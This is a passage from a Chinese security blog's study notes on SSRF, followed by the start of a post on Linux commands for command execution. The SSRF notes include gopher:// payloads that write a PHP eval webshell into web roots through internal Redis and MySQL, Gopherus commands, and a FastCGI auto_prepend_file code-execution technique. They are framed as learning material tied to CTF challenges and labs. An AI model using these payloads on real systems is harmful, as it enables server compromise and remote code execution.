class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adir%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">16</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a/var/www/html/%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">6</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aconfig%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">3</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aset%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">10</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>adbfilename%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aroot%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a*<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a$<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>asave%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aquit%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p>最好用<a href="https://github.com/tarunkant/Gopherus">gopher一键生成工具 </a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1<br><span class="hljs-variable">$8</span><br>flushall<br>*3<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$1</span><br>1<br><span class="hljs-variable">$28</span><br><br><br>&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br><br><br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">dir</span><br><span class="hljs-variable">$13</span><br>/var/www/html<br>*4<br><span class="hljs-variable">$6</span><br>config<br><span class="hljs-variable">$3</span><br><span class="hljs-built_in">set</span><br><span class="hljs-variable">$10</span><br>dbfilename<br><span class="hljs-variable">$9</span><br>shell.php<br>*1<br><span class="hljs-variable">$4</span><br>save<br></code></pre></td></tr></table></figure><p>该工具可以帮你生成符合Gopher协议格式的payload，以利用SSRF攻击Redis、FastCGI、MySql等内网应用。</p><p>python2 gopherus.py –exploit redis</p><p>ssrf-lab-basic测试</p><p>[<a href="https://blog.csdn.net/qq_45521281/article/details/106532501">GKCTF2020]EZ三剑客-EzWeb］</a>攻击内网Redis例题</p><h3 id="攻击内网FastCGI"><a href="#攻击内网FastCGI" class="headerlink" title="攻击内网FastCGI"></a>攻击内网FastCGI</h3><p>Fastcgi其实是一个<a href="https://so.csdn.net/so/search?q=%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020">通信协议</a>，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>具体参考：<a href="https://blog.csdn.net/mysteryflower/article/details/94386461">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p><p> <strong>php-fpm（FastCGI进程管理器）</strong></p><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>如上提到的，fastcgi中的record也有请求头和请求体，在请求头中有一个参数type，当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">用户访问http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/index.php?a=1&amp;b=2，如果web目录是/</span>var<span class="hljs-regexp">/www/</span>html，那么Nginx会将这个请求变成如下key-value对：<br><br>    &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="hljs-string">&#x27;/var/www/html/index.php&#x27;</span>,<span class="hljs-regexp">//</span>脚本文件名很重要<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="hljs-string">&#x27;/index.php&#x27;</span>,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;?a=1&amp;b=2&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: <span class="hljs-string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/var/www/html&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p><p><img src="https://image.3001.net/images/20210208/1612761214_6020c87ec0101f355f51a.png!small" alt="1612761214_6020c87ec0101f355f51a.png!small"></p><p><strong>攻击FastCGI的主要原理</strong></p><p>在设置环境变量实际请求中会出现一个<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>这样的键值对（已经存在的文件），它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。比如你传入一个shell.php,但这是不存在的，多以也无法利用。</p><p>而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过<strong>PHP_ADMIN_VALUE</strong>和<strong>PHP_VALUE</strong>去动态修改PHP的设置。</p><p>那么当设置PHP环境变量为：<code>auto_prepend_file = php://input;allow_url_include = On</code>时，就会在执行PHP脚本之前包含环境变量<code>auto_prepend_file</code>所指向的文件内容，<code>php://input</code>也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">auto_append_file</span>    <span class="hljs-comment">#在执行php文件后自动包含一个指定文件</span><br>auto_prepend_file   <span class="hljs-comment">#在执行php文件前自动包含一个指定文件</span><br></code></pre></td></tr></table></figure><p>总结就是：</p><p>​    可以把恶意代码post上去，然后通过修改配置 PHP_VALUE 为 auto_prepend_file &#x3D; php:&#x2F;&#x2F;input ， PHP_ADMIN_VALUE 为 allow_url_include &#x3D; On 然后将我们需要执行的代码放在Body中，即可执行任意代码。</p><p>没有找到合适的环境</p><p>可以之后参考下具体的题目：<a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><p>完整exp参考<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">p神写的</a></p><p>简单用法 首先监听</p><p><img src="https://image.3001.net/images/20210208/1612761324_6020c8ec83d83f3f029f8.png!small" alt="1612761324_6020c8ec83d83f3f029f8.png!small"></p><p>nc -lvvp [端口] &gt; [文件名]</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">python <span class="hljs-selector-attr">[脚本名]</span> -c <span class="hljs-selector-attr">[要执行的代码]</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-selector-attr">[端口号]</span> <span class="hljs-selector-attr">[ip]</span> <span class="hljs-selector-attr">[要执行的php文件]</span><br></code></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20210208/1612761343_6020c8ffc17aa6ad38f90.png!small" alt="1612761343_6020c8ffc17aa6ad38f90.png!small"></p><p>具体参考<a href="https://www.freebuf.com/articles/web/263342.html">https://www.freebuf.com/articles/web/263342.html</a></p><p>同样可以利用刚刚的gopher工具，但这个也还没实践过，这里放一下工具生成简单命令的图片</p><p>使用<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>生成攻击FastCGI的payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">python2 gopherus.py --exploit fastcgi<br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php    <span class="hljs-comment"># 这里输入的是一个已知存在的php文件</span><br>id    <span class="hljs-comment"># 输入一个你要执行的命令</span><br></code></pre></td></tr></table></figure><p><img src="/image/9.png"></p><p><img src="https://image.3001.net/images/20210114/1610598043_5fffc69b181c82c561065.png" alt="img"></p><h3 id="攻击内网MySql"><a href="#攻击内网MySql" class="headerlink" title="攻击内网MySql"></a>攻击内网MySql</h3><p>首先我们要先了解一下MySql数据库用户认证的过程。MySQL分为服务端和客户端。MySQL数据库用户认证采用的是 挑战&#x2F;应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程。</p><p>登录时需要用服务器发来的挑战码(scramble)将密码加密，但是当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p><p>当数据库用户密码为空时，加密后的密文也为空。客户端给服务端发的认证包就是相对固定的了。这样就无需交互了，可以通过Gopher协议来直接发送了。</p><p>一样也可以用gopher生成工具</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 gopherus<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--exploit</span> mysql<br></code></pre></td></tr></table></figure><p><img src="/image/8.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3306</span>/_<span class="hljs-variable">%a3</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%85</span><span class="hljs-variable">%a6</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><span class="hljs-variable">%21</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%64</span><span class="hljs-variable">%00</span><span class="hljs-variable">%66</span><span class="hljs-variable">%03</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%05</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%75</span><span class="hljs-variable">%78</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%08</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%04</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%05</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%35</span><span class="hljs-variable">%35</span><span class="hljs-variable">%0</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%06</span><span class="hljs-variable">%35</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%09</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%06</span><span class="hljs-variable">%78</span><span class="hljs-variable">%38</span><span class="hljs-variable">%36</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%67</span><span class="hljs-variable">%72</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%5</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%05</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%03</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%31</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><span class="hljs-variable">%01</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%01</span><br></code></pre></td></tr></table></figure><h3 id="SSRF-via-Request-Splitting"><a href="#SSRF-via-Request-Splitting" class="headerlink" title="SSRF via Request Splitting"></a>SSRF via Request Splitting</h3><p>因为’\r\n’造成的crlf漏洞 以及一些特殊字符将请求头分离造成的ssrf危害</p><p>没有仔细看这个</p><p>这个把所有的ssrf讲的非常详细（但是全英的，量力而行）<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><blockquote><p>参考链接</p><p><a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p><p><a href="https://blog.csdn.net/qq_57172130/article/details/126169480">https://blog.csdn.net/qq_57172130/article/details/126169480</a></p><p><a href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><p>使用的ssrf-lib环境：</p><p><a href="https://github.com/m6a-UdS/ssrf-lab/">https://github.com/m6a-UdS/ssrf-lab/</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行利用总结</title>
    <link href="/2022/08/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2022/08/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="初识Linux"><a href="#初识Linux" class="headerlink" title="初识Linux"></a>初识Linux</h1><h2 id="1-linux系统目录结构"><a href="#1-linux系统目录结构" class="headerlink" title="1.linux系统目录结构"></a>1.linux系统目录结构</h2><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/4_20.png" alt="img"></p><h2 id="2-linux基本命令"><a href="#2-linux基本命令" class="headerlink" title="2.linux基本命令"></a>2.linux基本命令</h2><p>具体见<a href="https://www.runoob.com/linux/linux-command-manual.html">菜鸟教程</a></p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> (-l -a)          用来显示目标列表<br><br><span class="hljs-built_in">cd</span> [path]           用来切换工作目录<br><span class="hljs-built_in">cd</span> /                 进入根目录<br><span class="hljs-built_in">cd</span> ../               返回上一级目录<br><span class="hljs-built_in">cd</span> ./                进入当前目录<br><br><span class="hljs-built_in">pwd</span>                 以绝对路径的方式显示用户当前工作目录<br><br><span class="hljs-built_in">echo</span> [string]       打印一行文本，参数“-e”可激活转义字符<br><br><span class="hljs-built_in">cat</span> [file]          连接文件并打印到标准输出设备上<br><br>find                查找指定文件；用法：find 目录 -name 文件<br><br><span class="hljs-built_in">tac</span>                 和<span class="hljs-built_in">cat</span>相反，从最后一行开始显示文件内容，倒着看<br><br>more                一页一页的翻动<br><br>less [file]         允许用户向前或向后浏览文字档案的内容<br><br><span class="hljs-built_in">head</span>                取出文件前面几行<br><br><span class="hljs-built_in">tail</span>                取出文件后面几行<br><br><span class="hljs-built_in">nl</span>                  显示行号<br><br><span class="hljs-built_in">mv</span> [file1] [file2]  用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中<br><br><span class="hljs-built_in">cp</span> [file1] [file2]  用来将一个或多个源文件或者目录复制到指定的目的文件或目录<br><br><span class="hljs-built_in">tee</span> file1 file2     同<span class="hljs-built_in">cp</span><br><br><span class="hljs-built_in">rm</span> [file]           可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下                         属的所有文件及其子目录均删除掉<br><br>ps                  用于报告当前系统的进程状态<br><br>top                 实时查看系统的整体运行情况<br><br><span class="hljs-built_in">kill</span>                杀死一个进程<br><br>ifconfig            查看或设置网络设备<br><br>ping                查看网络上的主机是否工作<br>                    http://dnslog.cn/ dns平台             <br><br>netstat             显示网络连接、路由表和网络接口信息<br><br>nc(netcat)          建立 TCP 和 UDP 连接并监听<br><br>su                  切换当前用户身份到其他用户身份<br><br><span class="hljs-built_in">touch</span> [file]        创建新的空文件<br><br><span class="hljs-built_in">mkdir</span> [<span class="hljs-built_in">dir</span>]         创建目录<br><br><span class="hljs-built_in">chown</span>               变更某个文件或目录的所有者和所属组<br><br>vi/ vim /           字符终端的文本编辑器<br><br><span class="hljs-built_in">exit</span>                退出 shell<br><br>grep                查找文件里符合条件的字符串，常与管道符|、<span class="hljs-built_in">cat</span>、ps一起使用；<br><br>sed                 一个非交互式的行文本编辑器，它能对文件内容进行编辑<br><br>awk                 一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以                         来自标准输入(stdin)、一个或多个文件，或其它命令的输出<br><br><span class="hljs-built_in">chmod</span>               变更文件或目录的权限<br><span class="hljs-built_in">chmod</span>               u+x 目录/文件：给该目录/文件所有者赋予执行权限<br><span class="hljs-built_in">chmod</span>  ug-x         目录/文件：给该目录/文件所有者和组用户减去执行权限<br><span class="hljs-built_in">chmod</span>  777          目录/文件：给该目录/文件所有者、组用户、其他用户赋予所有权限(常用)<br><span class="hljs-built_in">chmod</span>  764          目录/文件：给该目录/文件所有者赋予全部权限，组用户赋予读写权限，其他用                     户赋予读权限<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ls -l /<br>lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Jun<span class="hljs-number"> 21 </span>22:44 bin -&gt; usr/bin<br>drwxr-xr-x  <span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Jul<span class="hljs-number"> 28 </span>08:48 boot<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 18561 </span>Apr <span class="hljs-number"> 2 </span>22:48 